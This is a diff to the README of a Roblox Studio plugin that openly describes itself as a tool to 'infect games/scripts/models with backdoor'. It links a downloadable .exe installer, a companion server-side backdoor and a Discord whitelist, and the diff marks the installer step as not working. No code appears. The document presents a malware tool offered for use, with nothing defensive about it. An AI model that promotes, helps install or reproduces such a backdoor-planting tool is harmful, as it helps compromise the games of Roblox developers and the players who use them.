@@ -5,7 +5,7 @@ Roblox plugin that can easily infect games/scripts/models with backdoor
 
 ⚠ Backdoor will work only with [LALOL Hub Backdoor ServerSide](https://github.com/Its-LALOL/LALOL-Hub/blob/main/Backdoor-Scanner/README.md)  ⚠ (join our discord server to whitelist)
 
-# Instalation (Installer)
+# ~~Instalation (Installer)~~ doesnt work
 1. [Download Installer](https://github.com/Its-LALOL/LALOL-Hub/raw/main/Backdoor-Infecter/LALOL%20Hub%20Infecter%20Installer.exe)
 2. Open it
 3. Restart your Roblox Studio
